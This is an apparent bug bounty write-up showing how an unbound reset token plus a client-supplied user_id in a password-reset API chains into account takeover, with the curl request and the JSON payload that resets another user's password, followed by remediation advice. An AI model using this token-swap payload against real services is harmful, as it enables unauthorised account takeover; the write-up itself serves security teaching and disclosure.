---
title: "From IDOR to Full Account Takeover: A Bug Bounty Walkthrough"
description: "How a boring-looking numeric ID in a password-reset flow chained into a complete account takeover — and how to find bugs like it."
date: 2026-06-10 09:00:00 +0000
categories: [Bug Bounty]
tags: [web, idor, bug-bounty, access-control, burp-suite]
difficulty: Medium
---

> **Disclaimer:** This writeup is for educational purposes. All testing was performed
> against a program with an explicit bug bounty scope and authorization. Never test
> systems you don't have permission to touch.

Insecure Direct Object References (IDOR) are one of the most common — and most
underestimated — access-control bugs on the web. In this post I'll walk through how a
single unprotected object reference in a password-reset endpoint chained into a full
**account takeover (ATO)**.

## Recon: mapping the reset flow

The target exposed a fairly typical password reset. After requesting a reset link, the
confirmation request looked like this:

```http
POST /api/v2/password/confirm HTTP/2
Host: target.example
Content-Type: application/json

{"user_id": 48213, "token": "a1b2c3", "new_password": "Winter2026!"}
```

Two things immediately stood out: the request carried a **client-controlled `user_id`**,
and the `token` looked short. I sent the request to Burp Repeater to poke at both.

## Testing the object reference

The first test is always the simplest: change the ID and watch the response.

```bash
# Baseline — our own account
curl -s -X POST https://target.example/api/v2/password/confirm \
  -H 'Content-Type: application/json' \
  -d '{"user_id":48213,"token":"a1b2c3","new_password":"Test123!"}'
```

The server validated the token against *our* account but never re-bound it to the
`user_id` in the body. That's the flaw: **the token and the target user were checked
independently.**

## Chaining to account takeover

Because the token wasn't scoped to a specific user, I could request a reset for my own
account, receive a valid token, then submit that token with a **different** `user_id`:

```json
{"user_id": 1, "token": "<my-valid-token>", "new_password": "Owned2026!"}
```

The API returned `200 OK` and the victim's password was changed. Full ATO against any
account whose numeric ID I could guess — and IDs were sequential.

## Impact and remediation

The fix is straightforward and worth stating plainly:

- **Bind reset tokens to the user they were issued for.** Never trust a `user_id` in the
  request body.
- Use **high-entropy, single-use, short-lived** tokens.
- Add server-side **authorization checks** on every object reference, not just
  authentication.

| Control | Before | After |
|---|---|---|
| Token scope | Global | Per-user |
| ID source | Request body | Server session |
| Token entropy | ~24 bits | 128 bits |

## Takeaways

IDOR bugs hide in the boring parts of an app — reset flows, profile endpoints, export
features. The methodology never changes: **find a reference you control, change it, and
observe whether authorization is actually enforced.**

Happy hunting — responsibly.
